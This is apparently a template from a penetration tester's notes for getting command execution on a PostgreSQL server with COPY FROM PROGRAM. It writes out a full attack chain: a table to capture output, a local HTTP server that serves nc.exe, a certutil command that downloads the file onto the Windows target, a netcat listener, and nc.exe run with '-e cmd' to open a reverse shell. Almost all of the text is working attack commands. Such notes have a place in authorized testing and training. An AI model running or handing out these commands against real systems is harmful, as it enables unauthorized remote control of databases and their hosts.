3-  Perform [[postgres command execution]]. Firstly upload nc64.exe and use it to get reverse shell. 
reference: [Informational Nuggets - Hacking and Development (pollevanhoof.be)](https://pollevanhoof.be/nuggets/SQL_injection/postgres_command_execution)

1) Create the table you want to hold the command output
```powershell
CREATE TABLE my_evil_table(cmd_output text);
```
2) upload nc.exe
copy nc.exe
```powershell
cp /usr/share/windows-resources/binaries/nc.exe .
```
then start python server
```powershell
python3 -m http.server 80
```
upload it to the target server
```powershell
COPY my_evil_table FROM PROGRAM 'certutil -urlcache -f http://<% tp.frontmatter["RHOSTS"] %>/nc.exe C:\Users\Public\nc.exe';
```

start a listener on kali side
```powershell
rlwrap -cAr nc -lvnp 445
```

run it
```powershell
COPY my_evil_table FROM PROGRAM 'C:\Users\Public\nc.exe <% tp.frontmatter["LHOST"] %> 445 -e cmd';
```
we should be in.
